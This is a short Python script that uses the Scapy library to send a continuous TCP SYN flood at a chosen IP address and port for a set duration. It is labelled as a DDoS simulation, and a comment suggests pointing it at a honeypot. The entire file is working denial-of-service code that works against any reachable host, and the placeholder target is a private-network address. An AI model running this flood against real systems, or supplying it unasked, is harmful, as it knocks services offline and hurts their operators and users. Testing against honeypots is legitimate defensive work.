from scapy.all import *
import random

def simulate_ddos(target_ip, target_port, duration=60):
    """Simulate a DDoS attack using SYN floods."""
    print(f"Simulating DDoS attack on {target_ip}:{target_port}...")
    packets = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    send(packets, inter=0.001, loop=1, timeout=duration, verbose=0)

if __name__ == '__main__':
    TARGET_IP = "192.168.1.100"  # Replace with honeypot IP
    TARGET_PORT = 5000
    simulate_ddos(TARGET_IP, TARGET_PORT)
